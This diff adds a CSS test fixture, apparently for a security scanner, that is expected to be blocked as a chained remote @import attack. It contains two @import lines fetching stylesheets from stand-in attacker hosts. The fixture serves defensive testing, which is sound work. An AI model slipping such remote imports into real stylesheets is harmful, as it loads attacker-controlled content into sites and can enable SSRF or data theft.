@@ -1,0 +1,12 @@
+/*
+ * Malicious Test CSS: Chained Remote @import Attack
+ * Attack Vector: Chaining external CSS rules that bypass single-payload checks or conduct SSRF
+ * Expected Result: BLOCKED (High Severity: untrusted-import-rule)
+ */
+
+@import url("https://attacker.evil/payload-stage2.css");
+@import "https://another-untrusted-cdn.evil/nested.css";
+
+:root {
+  --color-main: #222;
+}
